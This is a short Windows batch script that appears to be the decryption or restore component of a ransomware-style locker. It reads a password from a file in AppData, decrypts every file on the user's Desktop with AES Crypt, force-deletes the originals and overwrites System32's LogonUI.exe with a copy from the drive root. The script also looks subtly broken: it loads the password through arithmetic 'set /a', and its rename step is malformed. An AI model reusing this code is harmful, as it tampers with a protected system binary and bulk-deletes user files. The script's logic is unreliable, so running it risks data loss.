@echo off
cd "%appdata%"
for /f "tokens=*" %%A in ('type password.txt') do (
set /a pass = %%A
)
cd "%userprofile%\desktop"

For /f "tokens=*" %%A in ('dir /b /s /a-d-h') do (
C:\aescrypt -d -p %pass% "%%~A"
ren "%%~nA.b" "*."
del /f /q "%%~A"
)

copy "C:\LogonUI.exe" "C:\Windows\System32\LogonUI.exe" /y

pause
